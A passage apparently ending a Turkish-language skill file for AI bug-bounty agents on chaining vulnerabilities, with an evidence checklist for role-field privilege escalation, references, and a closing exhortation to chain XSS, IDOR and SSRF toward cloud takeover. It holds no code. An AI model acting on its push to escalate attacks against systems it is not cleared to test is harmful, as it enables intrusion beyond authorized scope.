- **Kanıt sırası:** (a) `role` alanının kabul edilip yansıması (önce/sonra fark), (b) önceden 403 olan admin endpoint'in artık 200'ü, (c) gerçekleşen ayrıcalıklı işlem.

---

## 📖 REFERANSLAR

- OWASP Testing Guide — Chained Vulnerability Testing
- MITRE ATT&CK — Lateral Movement Techniques
- HackerOne Hacktivity — Chained Vulnerability Reports
- Bug Bounty Reports Explained — Chain Attack Analysis
- OWASP Top 10 — Cross-Vulnerability Impact Matrix

---

> **"Zincirleme sanatı, güvenlik araştırmacısını script kiddie'den ayıran şeydir."**
> 
> Herkes tek bir XSS bulabilir. Ama o XSS'i bir IDOR ile zincirleyip admin paneline ulaşabilen, ordan SSRF ile cloud'u ele geçirebilen — İŞTE GERÇEK HACKER BUDUR.

**Bu skill'i KULLAN. Her bulguda 5 soruyu SOR. Zincirleme fırsatlarını KAÇIRMA. Cross-agent işbirliğini UNUTMA.**
